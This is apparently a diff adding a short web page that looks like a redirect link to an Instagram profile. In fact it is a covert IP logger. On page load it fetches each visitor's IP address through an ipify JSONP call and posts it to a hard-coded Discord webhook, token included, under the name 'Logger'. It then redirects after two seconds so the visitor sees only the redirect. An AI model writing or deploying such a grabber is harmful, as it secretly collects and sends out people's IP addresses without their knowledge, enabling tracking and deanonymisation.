@@ -1,0 +1,33 @@
+<script>
+function getIP(json) {
+  var request = new XMLHttpRequest(); //making a request for the webhook
+      request.open("POST", "https://discord.com/api/webhooks/1089985099384229919/avQzLNgxVZC4XHSEUg_SgEHyTlCOb4VFN5ikhy7WxDNm20IF4UDHk8Sfi1p7kSE0__h-");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var params = {
+        username: "Logger",
+        avatar_url: "",
+        content: "**IP:** *" + json.ip + "*"
+      }
+   //just a webhook parameters such as avatar,name,message
+
+      request.send(JSON.stringify(params));
+    }
+
+	function x() {
+	window.location.replace(
+  "https://www.instagram.com/mateusz.adamczyk.50746/"
+  
+);
+	}
+	setTimeout(x,2000)
+</script>
+<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script> 
+
+<style>
+
+body {
+	background-image: url('x.png');
+}
+</style>
